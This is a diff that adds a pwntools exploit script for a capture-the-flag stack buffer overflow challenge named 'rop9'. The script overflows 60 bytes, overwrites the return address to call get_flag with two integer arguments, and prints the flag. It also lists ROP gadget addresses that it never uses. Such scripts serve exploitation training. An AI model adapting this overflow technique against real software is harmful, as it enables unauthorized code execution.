@@ -92,3 +92,49 @@
  '**Note:** Ensure that the addresses for gadgets and functions match those in '
  "your environment, as they may vary. Use tools like GDB and Pwntools' `ROP` "
  'module to identify correct gadget addresses if needed.')
+
+from pwn import *
+
+# Set up the binary and context
+binary = ELF('./pwn/stack/rop-9/rop9')
+context.binary = binary
+
+# Start the process or connect remotely
+# For local testing
+io = process(binary.path)
+# Uncomment below for remote connection (adjust IP and port accordingly)
+# io = remote('remote.server.com', 1234)
+
+# Find the offset to the return address
+offset = 60  # Adjusted after analyzing the binary with cyclic patterns
+
+# Addresses of the functions and required gadgets
+get_flag = binary.symbols['get_flag']
+pop_eax_ret = 0x080b91e6  # pop eax ; ret
+pop_edx_ecx_ebx_ret = 0x0806fc31  # pop edx ; pop ecx ; pop ebx ; ret
+mov_dword_ptr_edx_eax_ret = 0x0805466a  # mov dword ptr [edx], eax ; ret
+pop_ebp_ret = 0x080483ba  # pop ebp ; ret
+leave_ret = 0x0804846f    # leave ; ret
+
+# Craft the payload
+payload = b'A' * offset
+
+# Prepare the arguments for get_flag
+arg1 = 814536271
+arg2 = 425138641
+
+# Since get_flag expects two integers, we'll set up the stack accordingly
+payload += p32(get_flag)  # Overwrite the return address with get_flag's address
+payload += b'BBBB'  # Placeholder for the saved EBP (can be any value)
+payload += p32(arg1)       # First argument to get_flag
+payload += p32(arg2)       # Second argument to get_flag
+
+# Send the payload
+io.sendlineafter('Qual a palavrinha magica? ', payload)
+
+# Receive and print the flag
+flag = io.recvall()
+print(flag.decode())
+
+# Clean up
+io.close()
